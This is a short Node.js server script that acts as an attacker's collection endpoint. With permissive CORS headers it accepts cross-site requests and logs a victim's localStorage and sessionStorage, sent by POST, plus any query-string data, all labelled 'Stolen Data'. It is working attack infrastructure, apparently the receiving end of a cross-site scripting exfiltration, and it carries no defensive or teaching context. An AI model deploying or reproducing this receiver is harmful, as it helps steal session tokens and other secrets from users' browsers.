// cd the directory and then run `node server.js`

const http = require('http');
const url = require('url');

const server = http.createServer((req, res) => {
    // Add CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const parsedBody = JSON.parse(body);
                console.log('Stolen Data (POST Body):');
                console.log('  LocalStorage:', JSON.parse(parsedBody.localStorage));
                console.log('  SessionStorage:', JSON.parse(parsedBody.sessionStorage));
            } catch (error) {
                console.error('Error parsing POST body:', error);
            }
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('Data received');
        });
        return; // Ensure no further processing for POST requests
    }

    if (req.method !== 'GET') {
        res.writeHead(405, { 'Content-Type': 'text/plain' });
        res.end('Method Not Allowed');
        return;
    }

    // Ensure this block is outside the POST handler
    const queryObject = url.parse(req.url, true).query;
    console.log('Stolen Data:', queryObject);

    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Data received');
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}/`);
});